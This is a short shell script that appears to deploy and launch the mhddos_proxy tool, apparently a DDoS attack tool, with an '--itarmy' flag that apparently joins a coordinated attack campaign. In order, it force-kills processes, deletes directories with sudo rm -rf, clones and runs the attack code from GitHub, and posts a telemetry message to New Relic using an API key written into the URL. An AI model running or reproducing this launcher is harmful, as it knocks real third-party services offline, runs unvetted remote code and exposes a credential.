sudo pkill -e -f runner.py
sudo pkill -e -f finder.py
cd ~
sudo rm -rf mhddos_proxy proxy_finder
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -c "import requests; requests.post('https://log-api.eu.newrelic.com/log/v1?Api-Key=eu01xx60b22b235f529f8300080bf55aFFFFNRAL', json={'message': 'finder_to_mhddos'}, timeout=10)"
bash ./runner.sh python3 --itarmy
